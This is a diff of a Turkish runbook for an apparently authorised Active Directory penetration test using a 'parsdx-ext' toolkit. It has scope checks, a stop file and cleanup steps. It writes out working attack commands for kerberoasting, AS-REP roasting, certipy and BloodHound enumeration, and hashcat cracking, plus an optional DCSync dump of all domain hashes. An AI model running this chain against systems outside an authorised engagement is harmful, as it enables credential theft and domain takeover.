@@ -46,15 +46,18 @@ Sadece bu dosyadaki hedeflere dokunulur; DEVICE_INVENTORY'de olsa bile kapsam d�
 
 **c) HAZIRLIK KONTROLÜ — canlıdan önce GO/NO-GO (yarım yolda eksik çıkmasın):**
 ```bash
-python3 parsdx-ext/doctor.py --scope scope.txt --run-dir "<RUN>" \
+parsdx-ext/.venv/bin/python3 parsdx-ext/doctor.py --scope scope.txt --run-dir "<RUN>" \
   --dc <DC_FQDN> --domain <DOMAIN> --ip <DC_IP> --user <TEST_KULLANICI> --password '<PAROLA>'
 ```
-→ Araçlar kurulu mu, scope geçerli mi, kimlik var mı, DC'ye ağ yolu var mı hepsini kontrol eder.
-**NO-GO derse [FAIL] satırlarını düzelt, GO görmeden ilerleme.** (Kimlik doğrulaması yapmaz, sadece kontrol.)
+→ Araçlar kurulu mu, scope geçerli mi, kimlik var mı, DC'ye ağ yolu var mı, **ve SAAT KAYMASI** var mı
+hepsini kontrol eder. **NO-GO derse [FAIL] satırlarını düzelt, GO görmeden ilerleme.** (Kimlik doğrulaması
+yapmaz, sadece kontrol; scope dışı hedefe prob atmaz.)
+⚠️ **Saat kayması Kerberos'u öldürür:** doctor "clock skew" FAIL/WARN derse, canlıdan önce senkronla:
+`sudo ntpdate <DC_IP>` (veya `sudo timedatectl set-ntp true`). >5 dk fark = tüm Kerberos (kerberoast/AS-REP/certipy) patlar.
 
 **d) Planı gör (hiçbir şey çalıştırmaz):**
 ```bash
-python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --scope scope.txt \
+parsdx-ext/.venv/bin/python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --scope scope.txt \
   --dc <DC_FQDN> --domain <DOMAIN> --ip <DC_IP> \
   --user <TEST_KULLANICI> --password '<PAROLA>' --dry-run
 ```
@@ -70,7 +73,7 @@ yanlış/eski şifre olursa **fan-out'tan ÖNCE** durur, hesabı kilitlemez.)
 
 **f) Canlı çalıştır (read-only-first zincir; yazma/dump KAPALI):**
 ```bash
-python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --scope scope.txt \
+parsdx-ext/.venv/bin/python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --scope scope.txt \
   --dc <DC_FQDN> --domain <DOMAIN> --ip <DC_IP> \
   --user <TEST_KULLANICI> --password '<PAROLA>'
 ```
@@ -79,17 +82,18 @@ Bir şey ters giderse: `touch "<RUN>/STOP"` → çalışan zincir bir sonraki ad
 
 **f2) (Opsiyonel) Toplanan hash'leri OFFLINE kır — kilitleme riski yok:**
 ```bash
-python3 parsdx-ext/crack.py "<RUN>"                     # .hash dosyaları + hashcat komutları
-hashcat -m 13100 "<RUN>/parsdx/hashes/kerberoast.hash" /usr/share/wordlists/rockyou.txt
-hashcat -m 13100 "<RUN>/parsdx/hashes/kerberoast.hash" --show > show.txt
-python3 parsdx-ext/crack.py "<RUN>" --results show.txt  # kırılanları bulguya çevir
-python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --skip-attack --no-report   # rapora işle
+parsdx-ext/.venv/bin/python3 parsdx-ext/crack.py "<RUN>"   # .hash dosyaları + DOĞRU hashcat komutları
+# crack.py çıktısındaki komutları çalıştır (mod etype'a göre değişir: RC4→13100, AES→19600/19700):
+hashcat -m <MOD> "<RUN>/parsdx/hashes/<dosya>.hash" /usr/share/wordlists/rockyou.txt
+hashcat -m <MOD> "<RUN>/parsdx/hashes/<dosya>.hash" --show > show.txt
+parsdx-ext/.venv/bin/python3 parsdx-ext/crack.py "<RUN>" --results show.txt  # kırılanları bulguya çevir
+parsdx-ext/.venv/bin/python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --skip-attack --no-report   # rapora işle
 ```
 Tamamen çevrimdışı (ağa dokunmaz). "Roastable" → "şifresi kırıldı = gerçek kimlik" bulgusuna döner.
 
 **g) (Yalnız gerekliyse, Claude onaylarsa) yazma/dump adımları:**
 ```bash
-python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --scope scope.txt ... \
+parsdx-ext/.venv/bin/python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --scope scope.txt ... \
   --enable-writes --allow-dcsync
 ```
 → `YETKILIYIM` yazman istenir (pipeline'da da). DCSync = **sadece kanıt** (`-just-dc-ntlm`), veri
@@ -109,7 +113,8 @@ işte elle `YETKILIYIM` yaz.
 - [ ] **DCSync hash'lerini laptobuna ÇEKME.** `dcsync_dump.txt` krbtgt dahil tüm hash'leri içerir; rapora
       sadece asgari kanıt girer, ham dosya AnyDesk ile çekilmez.
 - [ ] Kanıt zaten `0600` + `parsdx/` `0700`; iş bitince loot'u sil:
-      `shred -u "<RUN>/parsdx/dcsync_dump.txt" 2>/dev/null; rm -f "<RUN>/parsdx/"*.txt`
+      `shred -u "<RUN>/parsdx/dcsync_dump.txt" "<RUN>/parsdx/hashes/"*.hash show.txt 2>/dev/null; rm -f "<RUN>/parsdx/"*.txt`
+      (⚠️ `hashes/*.hash` = roastable Kerberos hash'leri, `show.txt` = kırılan açık şifreler — bunlar toksik, mutlaka sil.)
 - [ ] Cracked/elde edilen kimlik bilgileri = toksik; ağ dışında tut, iş bitince imha et.
 - [ ] Client isterse `destroy` ile WSL'i tamamen kaldır (⚠️ TÜM WSL'i siler — önce raporu dışarı al).
 
@@ -122,7 +127,7 @@ parsdx-ext/.venv/bin/python3 parsdx-ext/guard.py --policy --dc <DC> --domain <DO
 # ADCS (en sessiz DA yolu):
 certipy find -u <U>@<DOM> -p '<P>' -dc-ip <IP> -vulnerable -stdout
 # BloodHound (sessiz):
-bloodhound-python -d <DOM> -u <U> -p '<P>' -c DCOnly -ns <IP> --zip
+bloodhound-ce-python -d <DOM> -u <U> -p '<P>' -c DCOnly -ns <IP> --zip   # setup-offensive.sh bunu kurar (CE)
 # Kerberoast / AS-REP (gecerli hesap, lockout riski yok):
 impacket-GetUserSPNs <DOM>/<U>:'<P>' -request -dc-ip <IP>
 impacket-GetNPUsers <DOM>/<U>:'<P>' -request -format hashcat -dc-ip <IP>
